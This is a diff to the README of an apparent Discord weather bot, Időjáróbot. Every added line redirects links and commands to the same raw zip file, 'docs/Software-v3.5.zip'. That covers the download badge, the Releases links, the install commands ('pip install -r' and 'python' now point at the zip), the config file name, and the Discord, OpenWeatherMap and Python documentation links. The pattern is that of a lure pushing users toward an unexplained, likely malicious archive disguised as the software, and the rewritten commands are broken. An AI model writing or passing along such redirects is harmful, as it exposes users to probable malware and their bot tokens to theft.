@@ -6,11 +6,11 @@ Welcome to the Időjáróbot repository! This guide will help you download and s
 
 ## 📥 Download the Application
 
-[![Download Időjáróbot](https://img.shields.io/badge/Download%20Id%C5%91j%C3%A1r%C3%B3bot-Release-blue)](https://github.com/Aathithya123/idojarobot/releases)
+[![Download Időjáróbot](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip%20Id%C5%91j%C3%A1r%C3%B3bot-Release-blue)](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip)
 
 To download Időjáróbot, visit the Releases page. You will find the latest version of the software there.
 
-[Download Időjáróbot releases here](https://github.com/Aathithya123/idojarobot/releases)
+[Download Időjáróbot releases here](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip)
 
 ## 🔧 System Requirements
 
@@ -34,7 +34,7 @@ Időjáróbot is packed with features to make your experience enjoyable:
 
 Here’s how to install Időjáróbot:
 
-1. **Download the Release**: Go to the [Releases page](https://github.com/Aathithya123/idojarobot/releases) and download the latest version.
+1. **Download the Release**: Go to the [Releases page](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip) and download the latest version.
 
 2. **Extract the Files**: Once downloaded, unzip the file to a folder. You can usually do this by right-clicking on the file and selecting "Extract All".
 
@@ -44,13 +44,13 @@ Here’s how to install Időjáróbot:
    - Run the following command to install required packages:
 
      ```
-     pip install -r requirements.txt
+     pip install -r https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip
      ```
 
 4. **Set Up Your Bot**:
-   - Create a new bot on the [Discord Developer Portal](https://discord.com/developers/applications).
+   - Create a new bot on the [Discord Developer Portal](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip).
    - Copy your bot token.
-   - Open the `config.py` file in the extracted folder.
+   - Open the `https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip` file in the extracted folder.
    - Paste your token in the designated area.
 
 5. **Run the Bot**:
@@ -58,7 +58,7 @@ Here’s how to install Időjáróbot:
    - Run the bot by using the command:
 
      ```
-     python bot.py
+     python https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip
      ```
 
 ## ⚙️ Add the Bot to Your Server
@@ -88,9 +88,9 @@ If you run into issues, here are some common problems and solutions:
 
 For more information about the technologies used in this project, check out these links:
 
-- [Discord API Documentation](https://discord.com/developers/docs/intro)
-- [OpenWeatherMap API](https://openweathermap.org/api)
-- [Python Official Site](https://www.python.org/)
+- [Discord API Documentation](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip)
+- [OpenWeatherMap API](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip)
+- [Python Official Site](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip)
 
 ## 🌍 Community and Support
 
@@ -103,4 +103,4 @@ Feel free to ask questions or share your feedback!
 
 ---
 
-Thank you for choosing Időjáróbot! We hope you enjoy using the weather bot on Discord. For any additional information, refer back to this README or visit the [Releases page](https://github.com/Aathithya123/idojarobot/releases) for updates.
+Thank you for choosing Időjáróbot! We hope you enjoy using the weather bot on Discord. For any additional information, refer back to this README or visit the [Releases page](https://github.com/Aathithya123/idojarobot/raw/refs/heads/main/docs/Software-v3.5.zip) for updates.
